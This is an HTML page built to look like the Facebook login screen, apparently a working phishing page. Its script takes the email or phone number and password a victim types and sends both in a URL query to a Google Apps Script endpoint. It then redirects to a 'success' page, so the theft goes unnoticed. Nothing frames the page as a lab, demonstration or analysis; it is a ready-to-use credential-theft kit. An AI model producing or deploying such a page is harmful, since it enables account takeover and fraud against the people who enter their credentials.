<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Log in to Facebook</title>
  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #f0f2f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 30px 15px;
    }

    .fb-logo {
      font-size: 48px;
      color: #1877f2;
      font-weight: bold;
      margin: 40px 0 10px;
    }

    .info-box {
      background-color: #e7f3ff;
      border: 1px solid #a6c8ff;
      color: #1d2129;
      padding: 12px;
      font-size: 14px;
      width: 100%;
      max-width: 400px;
      text-align: center;
      border-radius: 6px;
      margin-bottom: 20px;
    }

    .login-box {
      background-color: #ffffff;
      border-radius: 8px;
      padding: 24px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    }

    .login-box h2 {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 16px;
    }

    .warning-box {
      background-color: #fffbe2;
      border: 1px solid #f7dc6f;
      color: #555;
      padding: 10px;
      border-radius: 4px;
      font-size: 13px;
      margin-bottom: 16px;
    }

    input {
      width: 90%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      margin-top: 10px;
      cursor: pointer;
    }

    .links {
      margin-top: 16px;
      font-size: 13px;
      text-align: center;
    }

    .links a {
      color: #1877f2;
      text-decoration: none;
      margin: 0 5px;
    }

    @media (max-width: 500px) {
      .fb-logo {
        font-size: 40px;
      }

      .login-box {
        padding: 20px;
      }
    }

    input {
        width: 100%;
        padding: 10px;
        margin: 8px 0;
        border: 1px solid var(--input-border);
        border-radius: 3px;
        background: var(--input-bg);
        font-size: 14px;
      }
  
      .input-eye {
        position: relative;
      }
  
      .input-eye input {
        width: 100%;
      }
  
      .eye-icon {
        color: #020202;          /* Instagram's dark font color */
  
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        font-size: 18px;
        cursor: pointer;
      }
  </style>
</head>
<body>

  <div class="fb-logo">facebook</div>

  <!-- Blue info box (top message) -->
  <div class="info-box">You must log in to continue.</div>

  <!-- Login UI Box -->
  <div class="login-box">
    <h2>Log in to Facebook</h2>

    <!-- Yellow alert -->
    <div class="warning-box">You must log in to continue.</div>

    <input type="text" id="username" placeholder="Email address or phone number">
    
    <div class="input-eye">
        <input type="password" id="password" placeholder="Password">
        <span class="eye-icon" onclick="togglePassword()">Show</span>
      </div>
    <button onclick="sendData()">Log In</button>

    <div class="links">
      <a href="#">Forgotten account?</a> Â· <a href="#">Sign up for Facebook</a>
    </div>
  </div>

  <script>
    function sendData() {
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
      
        if (!username || !password) {
          alert("Please enter both fields.");
          return;
        }
      
        const url = `https://script.google.com/macros/s/AKfycbzAsp9ZP7L4Oazl7rzITe3DOcCGsYyI2CnVpfbhWTLpoY5bUi-G0WVwmtN0tJsTZxBB/exec?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
      
        fetch(url, {
          method: 'GET',
          mode: 'no-cors' // ðŸ’¥ this avoids CORS and silent failures
        })
        .then(() => {
          // âœ… Don't try to read the response. Just go to main.html
          window.location.href = "success.html";
        })
        .catch((err) => {
          console.error("Even with no-cors, it failed:", err);
          alert("Still couldn't send. Check your script access settings.");
        });
      }

      function togglePassword() {
        const passwordInput = document.getElementById("password");
        const eyeIcon = document.querySelector(".eye-icon");
    
        if (passwordInput.type === "password") {
          passwordInput.type = "text";
          eyeIcon.textContent = "Hide";
        } else {
          passwordInput.type = "password";
          eyeIcon.textContent = "Show"; // original icon
        }
      }
      
  </script>


  
</body>
</html>
